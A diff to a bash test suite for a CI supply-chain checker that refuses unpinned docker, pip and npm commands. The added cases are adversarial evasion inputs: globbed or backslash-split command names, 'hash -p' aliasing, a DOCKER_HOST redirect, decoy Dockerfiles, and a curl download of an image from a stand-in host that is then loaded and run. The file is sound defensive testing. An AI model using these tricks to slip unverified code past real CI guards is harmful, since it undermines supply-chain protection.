@@ -654,7 +654,12 @@ case_ run-loop-body            bad "$(r 'for x in 1; do docker run alpine; done'
 case_ run-timeout              bad "$(r 'timeout 30 docker run alpine')"
 case_ run-env-wrapper          bad "$(r 'env A=b nohup docker pull alpine')"
 case_ run-xargs                bad "$(r 'echo x | xargs docker run alpine')"
+# Codex #164 adversarial r1 C10: a template vouches only for the words of its literal for-list
 case_ run-local-template       ok  "$head
+    steps:
+      - run: for v in production debug; do docker tag \"\$src\" \"fa-\${v}\"; done
+      - run: docker run --rm fa-production"
+case_ run-local-template-other bad "$head
     steps:
       - run: for v in a b; do docker tag \"\$src\" \"fa-\${v}\"; done
       - run: docker run --rm fa-production"
@@ -794,7 +799,8 @@ case_ x2-poetry                bad "$(r 'poetry add requests')"
 case_ x2-pip-sync              bad "$(r 'pip-sync requirements.txt')"
 case_ x2-setup-py              bad "$(r 'python setup.py install')"
 case_ x2-python-m-build        bad "$(r 'python3 -m build')"
-case_ x2-uv-pip-sync-hashed    ok  "$(r 'uv pip sync --require-hashes -r requirements.txt')" "printf 'x==1 --hash=sha256:00\\n' > requirements.txt"
+# Codex #164 adversarial r1 C04: uv is not used here; any invocation is refused (was: hashed uv pip sync accepted)
+case_ x2-uv-pip-sync-hashed    bad "$(r 'uv pip sync --require-hashes -r requirements.txt')" "printf 'x==1 --hash=sha256:00\\n' > requirements.txt"
 case_ x2-python-script         ok  "$(r 'python3 bin/check.py --sync install')"
 
 # --- Sonnet #164 r4 (NEW-3, NEW-4): a decoy Dockerfile; command substitution severing the image argument
@@ -1013,7 +1019,8 @@ case_ n12-bash-template-ok     ok  "$head
 # --- Sonnet #164 r11 (NEW-13): a registry-qualified template never stands for "our own bytes"
 case_ n13-registry-template    bad "$(rb 'docker tag alpine@sha256:b1934ee5f1c509618f2508e6eb47ee0d3520686341fec936f3b79331f9315667 ghcr.io/myorg/approved-${GITHUB_SHA}; docker run ghcr.io/myorg/approved-other')"
 case_ n13-registry-exact-ok    ok  "$(rb 'docker tag alpine@sha256:b1934ee5f1c509618f2508e6eb47ee0d3520686341fec936f3b79331f9315667 ghcr.io/myorg/approved; docker run ghcr.io/myorg/approved')"
-case_ n13-local-template-ok    ok  "$(rb 'for v in a b; do docker tag "$src" "fa-${v}"; done; docker run fa-production')"
+case_ n13-local-template-ok    ok  "$(rb 'for v in production debug; do docker tag "$src" "fa-${v}"; done; docker run fa-production')"
+case_ c10-template-not-listed  bad "$(rb 'for v in a b; do docker tag "$src" "fa-${v}"; done; docker run fa-production')"
 # --- Sonnet #164 r12 (NEW-14, NEW-15): every verb is checked, on a reviewed safe list, or refused
 case_ n14-podman-kube-play     bad "$(r 'podman kube play pod.yaml')"
 case_ n14-podman-play-kube     bad "$(r 'podman play kube pod.yaml')"
@@ -1051,7 +1058,8 @@ case_ n20-import-url           bad "$(r 'docker import https://x.example/rootfs.
 case_ n21-load-tag-run         bad "$(rb 'curl -sL https://x.example/i.tar -o i.tar; docker load -i i.tar; docker tag sha256:deadbeef myname:latest; docker run myname:latest')"
 case_ n21-tag-unpinned-src     bad "$(rb 'docker tag alpine:latest mine; docker run mine')"
 case_ n21-tag-pinned-src-ok    ok  "$(rb 'docker tag alpine@sha256:b1934ee5f1c509618f2508e6eb47ee0d3520686341fec936f3b79331f9315667 mine; docker run mine')"
-case_ n21-tag-variable-src-ok  ok  "$(rb 'docker tag "${repo}@${d}" "fa-${v}"; docker run fa-production')"
+case_ n21-tag-variable-src-ok  ok  "$(rb 'for v in production fips; do docker tag "${repo}@${d}" "fa-${v}"; done; docker run fa-production')"
+case_ c10-template-no-list     bad "$(rb 'docker tag "${repo}@${d}" "fa-${v}"; docker run fa-production')"
 case_ n22-archive-to-daemon-run bad "$(rb 'skopeo copy oci-archive:/tmp/x.oci docker-daemon:img:1; docker run img:1')"
 case_ n22-archive-scan-ok      ok  "$(rb 'skopeo copy oci-archive:/tmp/x.oci docker-daemon:img:1; grype docker:img:1; docker scout cves local://img:1')"
 case_ n22-pinned-to-daemon-ok   ok  "$(rb 'skopeo copy docker://alpine@sha256:b1934ee5f1c509618f2508e6eb47ee0d3520686341fec936f3b79331f9315667 docker-daemon:img:1; docker run img:1')"
@@ -1144,5 +1152,42 @@ case_ n32-combined-o-file-ok   ok  "$(rb 'bash -eo pipefail bin/x.sh')"
 case_ n32-repo-script-ok       ok  "$(rb 'bash bin/x.sh --flag; sh ./tools/y.sh')"
 case_ n32-bash-c-ok            ok  "$(rb 'bash -c "echo hi"')"
 case_ n32-docker-shell-arg-ok  ok  "$(rb 'docker run --rm alpine@sha256:b1934ee5f1c509618f2508e6eb47ee0d3520686341fec936f3b79331f9315667 sh -c true')"
+# --- Codex #164 adversarial r1 (C01, C03-C13): each a fail-closed reading of what bash, pip, docker or BuildKit does
+case_ c01-backslash-newline    bad "$(rb "doc\\
+          ker run alpine:3.20")"
+case_ c01-glob-name            bad "$(rb '/usr/bin/docke[r] run alpine:3.20')"
+case_ c01-glob-star            bad "$(rb '/usr/bin/dock?r run alpine:3.20')"
+case_ c01-ansi-whole           bad "$(rb "\$'docker' run alpine:3.20")"
+case_ c03-error-word-subst     bad "$(rb 'unset missing; : "${missing:?$(docker pull alpine)}"')"
+case_ c04-mpip-attached        bad "$(rb 'python3 -mpip install requests')"
+case_ c04-pip-main             bad "$(rb 'python3 -m pip.__main__ install requests')"
+case_ c04-setup-flag           bad "$(rb 'python3 -I setup.py install')"
+case_ c04-uv-option            bad "$(rb 'uv --no-cache pip install requests')"
+case_ c04-pipx-option          bad "$(rb 'pipx --verbose install black')"
+case_ c04-npm-prefix           bad "$(rb 'npm --prefix /tmp/pkg install lodash')"
+case_ c04-npm-alias            bad "$(rb 'npm in lodash')"
+case_ c05-log-swallows         bad "$(rb 'pip install --log --require-hashes -r req.txt')" "printf 'requests==2.32.3\\n' > req.txt"
+case_ c05-unknown-option       bad "$(rb 'pip install --require-hashes --frobnicate -r req.txt')" "printf 'x==1 --hash=sha256:00\\n' > req.txt"
+case_ c05-hashed-ok            ok  "$(rb 'python3 -m pip install --quiet --require-hashes --only-binary=:all: --break-system-packages -r req.txt')" "printf 'x==1 --hash=sha256:00\\n' > req.txt"
+case_ c06-skopeo-optval        bad "$(rb 'skopeo copy --override-os linux docker://alpine:latest dir:/tmp/img')"
+case_ c06-crane-optval         bad "$(rb 'PLATFORM=linux/amd64; crane pull --platform "$PLATFORM" alpine:latest /tmp/img.tar')"
+case_ c07-attached-f           bad "$(rb 'docker build -fDockerfile.evil .')" "printf 'FROM scratch\\n' > Dockerfile; printf 'FROM alpine:latest\\n' > Dockerfile.evil"
+case_ c07-f-equals             bad "$(rb 'docker build -f=Dockerfile.evil .')" "printf 'FROM scratch\\n' > Dockerfile; printf 'FROM alpine:latest\\n' > Dockerfile.evil"
+case_ c08-self-stage           bad "$(rb 'docker build -f Dockerfile.self .')" "printf 'FROM alpine AS alpine\\n' > Dockerfile.self"
+case_ c09-copy-from-image      bad "$(rb 'docker build -f Dockerfile.copy .')" "printf 'FROM scratch\\nCOPY --from=alpine:latest /etc/os-release /r\\n' > Dockerfile.copy"
+case_ c09-syntax-directive     bad "$(rb 'docker build -f Dockerfile.syntax .')" "printf '# syntax=docker/dockerfile:latest\\nFROM scratch\\n' > Dockerfile.syntax"
+case_ c09-buildkit-syntax-arg  bad "$(rb 'docker build --build-arg BUILDKIT_SYNTAX=docker/dockerfile:latest .')" "printf 'FROM scratch\\n' > Dockerfile"
+case_ c09-copy-from-stage-ok   ok  "$(rb 'docker build -f Dockerfile.ms .')" "printf 'FROM alpine@sha256:b1934ee5f1c509618f2508e6eb47ee0d3520686341fec936f3b79331f9315667 AS base\\nFROM scratch\\nCOPY --from=base /etc/os-release /r\\n' > Dockerfile.ms"
+case_ c10-pull-local-name      bad "$(rb 'docker build -t alpine .; docker pull alpine')" "printf 'FROM scratch\\n' > Dockerfile"
+case_ c10-pull-always          bad "$(rb 'docker build -t alpine .; docker run --pull=always alpine')" "printf 'FROM scratch\\n' > Dockerfile"
+case_ c10-branch-build         bad "$(rb 'if false; then docker build -t alpine .; fi; docker run alpine')" "printf 'FROM scratch\\n' > Dockerfile"
+case_ c10-rmi                  bad "$(rb 'docker build -t alpine .; docker rmi alpine; docker run alpine')" "printf 'FROM scratch\\n' > Dockerfile"
+case_ c10-template-sibling     bad "$(rb 'v=example; docker build -t "hello-${v}" .; docker run hello-world')" "printf 'FROM scratch\\n' > Dockerfile"
+case_ c10-own-build-ok         ok  "$(rb 'docker build -t fscache-local .; docker run --rm fscache-local')" "printf 'FROM scratch\\n' > Dockerfile"
+case_ c11-dir-copy             bad "$(rb 'cp -R evil/. .; docker build .')" "printf 'FROM scratch\\n' > Dockerfile; mkdir -p evil; printf 'FROM alpine\\n' > evil/Dockerfile"
+case_ c11-printf-consumer      bad "$(rb 'printf "FROM alpine\\n" > Dockerfile docker build; docker build .')" "printf 'FROM scratch\\n' > Dockerfile"
+case_ c12-hash-p               bad "$(rb 'hash -p /usr/bin/docker d; d run alpine:3.20')"
+case_ c13-quoted-export        bad "$(rb 'export "DOCKER_HOST=tcp://other:2375"; docker run alpine@sha256:b1934ee5f1c509618f2508e6eb47ee0d3520686341fec936f3b79331f9315667')"
+case_ c13-quoted-assign        bad "$(rb "'DOCKER_HOST=tcp://other:2375' docker run alpine@sha256:b1934ee5f1c509618f2508e6eb47ee0d3520686341fec936f3b79331f9315667")"
 echo "check-action-pins: $pass passed, $failn failed"
 [ "$failn" -eq 0 ]
